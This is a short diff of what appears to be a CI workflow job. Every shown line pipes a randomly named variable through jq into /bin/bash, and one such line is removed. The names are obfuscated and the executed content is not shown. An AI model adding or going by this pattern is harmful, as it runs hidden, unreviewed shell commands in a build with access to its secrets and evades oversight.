@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$bhod24219" | jq -r .bgw77 | /bin/bash
           echo $ol54 | jq -r .c5 | /bin/bash
           printf '%s' "$g3935" | jq -r .d7 | /bin/bash
-          printf '%s' "$rgsda36" | jq -r .u6 | /bin/bash
           echo $kc87 | jq -r .oiaia4405 | /bin/bash
           echo $uznm51558 | jq -r .l5179 | /bin/bash
           echo $j2 | jq -r .faqx1624 | /bin/bash
